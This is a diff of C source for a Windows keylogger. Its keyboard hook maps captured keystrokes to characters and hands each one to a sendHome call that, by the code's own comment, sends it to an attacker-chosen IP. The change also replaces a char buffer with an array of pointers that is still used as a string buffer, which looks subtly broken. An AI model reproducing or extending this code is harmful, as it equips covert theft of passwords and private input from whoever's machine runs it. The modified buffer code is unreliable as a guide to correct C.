@@ -70,13 +70,13 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 	//these characters will be used.
 	static char* shiftMap[] =
 	{
-		")", "!", "@", "#", "$", "%%", "^", 
-		"&", "*", "(", ":", "+", "<", "_", 
+		")", "!", "@", "#", "$", "%%", "^",
+		"&", "*", "(", ":", "+", "<", "_",
 		">", "?", "~", "{", "|", "}", "\""
 	};
 
 	//Buffer that holds the value of the incoming key
-	char string[10];
+	char* string[5];
 
 	//If a keyboard press id detected.
 	if (nCode == HC_ACTION)
@@ -91,12 +91,12 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 			SHORT shift = GetAsyncKeyState(VK_SHIFT);
 			int code = hookStruct->vkCode;
 
-			if (!shift && code >= 'A' && code <= 'Z')     sprintf_s(string, 10, "%c", code + 32);
-			else if (shift && code >= 48  && code <= 57)  sprintf_s(string, 10, shiftMap[code - 48]);
-			else if (shift && code >= 186 && code <= 192) sprintf_s(string, 10, shiftMap[code - 176]);
-			else if (shift && code >= 219 && code <= 222) sprintf_s(string, 10, shiftMap[code - 202]);
-			else sprintf_s(string, 10, "%s", map[code]);
-	
+			if (!shift && code >= 'A' && code <= 'Z') sprintf_s(string, 5, "%c", code + 32);
+			else if (shift && code >= 48 && code <= 57) sprintf_s(string, 5, shiftMap[code - 48]);
+			else if (shift && code >= 186 && code <= 192) sprintf_s(string, 5, shiftMap[code - 176]);
+			else if (shift && code >= 219 && code <= 222) sprintf_s(string, 5, shiftMap[code - 202]);
+			else sprintf_s(string, 5, "%s", map[code]);
+
 			//After the key press is mapped to a value from one of the
 			//arrays it is sent to the IP designated by the Attacker.
 			if (sendHome(string, 0))
